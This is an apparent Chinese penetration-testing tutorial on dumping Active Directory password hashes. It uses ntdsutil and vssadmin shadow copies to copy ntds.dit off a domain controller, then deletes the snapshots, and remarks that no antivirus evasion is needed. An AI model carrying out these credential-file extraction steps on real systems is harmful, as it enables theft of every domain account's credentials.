### 导出域hash

这里就介绍两个域控上自带的工具来导出域hash。  
原理是通过Volume Shadow Copy这个服务框架来完成的。  
该服务常用于数据备份，在2003及以上的系统都是支持的。  
通过这个方法去导出hash，是导出所有的用户hash，且不需要考虑免杀问题。  
不过会在系统日志留下ID为7036的日志记录。

#### ntdsutil

域环境默认安装的，且支持03及以上版本的服务器。  
利用过程很简单。  
1.创建快照

```
1.  `ntdsutil snapshot "activate instance ntds" create quit quit`
    
```

2.挂载快照  
在上面步骤中得到guid，填入下面的{}中。

```
1.  `ntdsutil snapshot "mount {}" quit quit`
    
```

![](../Images/96a11dbe9b2ae7399067aabc33b8083f.png)3.复制文件

```
1.  `copy 上图的路径\winodws\NTDS\ntds.dit C:\ntds.dit`
    
```

![](../Images/f2fe1cd24beb1516544b208d90c987ff.png)4.卸载并删除快照

```
1.  `ntdsutil snapshot  "unmount {}" quit quit`
    
2.  `ntdsutil snapshot  "delete {}" quit quit`
    
```

#### vssadmin

类似的一个工具，默认安装的。  
过程更简单。  
1.创建快照

```
1.  `vssadmin create shadow /for=c:`
    
```

得到Shadow Copy Volume Name为\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2  
2.复制文件

```
1.  `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\ntds1.dit`
    
```

![](../Images/51423ada86c89c9368c0f8dbbed9a9e5.png)3.删除快照

```
1.  `vssadmin delete shadows /for=c: /quiet`
    
```
